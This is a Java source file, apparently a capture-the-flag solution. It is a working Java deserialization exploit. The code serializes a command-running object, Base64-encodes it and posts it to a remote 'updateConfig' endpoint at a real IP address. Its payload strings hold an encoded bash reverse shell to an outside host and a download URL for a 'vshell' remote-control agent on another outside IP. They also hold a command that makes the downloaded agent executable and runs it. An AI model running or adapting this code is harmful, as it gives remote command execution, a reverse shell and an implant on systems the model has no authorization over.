package dev.silente.javashark.solution;

import java.io.*;
import java.net.URLEncoder;
import java.util.Base64;

import com.example.demo.Ping;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.HttpHost;
import org.apache.http.util.EntityUtils;

public class BaiLu2023 {
    public static void main(String[] args) throws Exception {
        String poc0 = "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0Mi4xMDQuNzgvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}";
        String poc1 = "http://8.217.5.107:10000/vshell_agent_linux_amd64";
        String poc2 = "chmod +x /app/Upload/vshell_agent_linux_amd64_lite && /app/Upload/vshell_agent_linux_amd64_lite";
        Ping ping=new Ping();
        ping.setCommand("bash");
        ping.setArg1("-c");

        ping.setArg2(poc2);
        String payload=Base64.getEncoder().encodeToString(serialize(ping));
        String url = "http://8.130.129.56:51180/internalApi/v3.2/updateConfig";
        String proxyHost = "127.0.0.1";
        int proxyPort = 8080;
        System.out.println(sendExp(payload,url, proxyHost, proxyPort));
    }
    public static String sendExp(String exp, String url, String proxyHost, int proxyPort) {
        try {
            // 创建HttpHost对象来设置代理
            HttpHost proxy = new HttpHost(proxyHost, proxyPort);

            // 创建RequestConfig对象并设置代理
            RequestConfig requestConfig = RequestConfig.custom().setProxy(proxy).build();

            // 创建HttpClient实例并将RequestConfig设置到HttpClient
            CloseableHttpClient httpClient = HttpClients.custom()
                    .setDefaultRequestConfig(requestConfig)
                    .build();

            // 创建POST请求
            HttpPost httpPost = new HttpPost(url);

            // 设置POST请求的payload
            StringEntity entity = new StringEntity(exp);
            httpPost.setEntity(entity);

            // 执行POST请求
            HttpResponse response = httpClient.execute(httpPost);

            // 获取响应实体
            HttpEntity responseEntity = response.getEntity();

            // 从响应实体中读取响应内容
            String responseString = EntityUtils.toString(responseEntity);

            // 关闭HttpClient
            httpClient.close();

            return responseString;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static byte[] serialize(Object yourObject) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = null;
        byte[] yourBytes;
        try {
            out = new ObjectOutputStream(bos);
            out.writeObject(yourObject);
            out.flush();
            yourBytes = bos.toByteArray();
        } finally {
            try {
                bos.close();
            } catch (IOException ex) {
                // ignore close exception
            }
        }
        return yourBytes;
    }
    public static Object deserialize(byte[] bytes) throws Exception{
        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bis);
        bis.close();
        ois.close();
        return ois.readObject();
    }
}